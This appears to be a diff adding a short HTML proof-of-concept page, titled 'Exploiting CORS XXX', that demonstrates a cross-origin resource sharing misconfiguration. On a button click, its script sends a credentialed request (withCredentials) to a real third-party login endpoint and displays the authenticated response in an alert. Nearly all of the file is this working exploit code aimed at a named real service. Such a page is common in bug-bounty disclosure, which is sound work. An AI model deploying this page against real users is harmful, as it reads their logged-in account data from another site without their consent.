@@ -1,0 +1,22 @@
+<html>
+<center>
+<h2>Exploiting CORS XXX</h2>
+</center>
+<div id="test">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("test").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://cloudinary.com/users/login", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+</html>
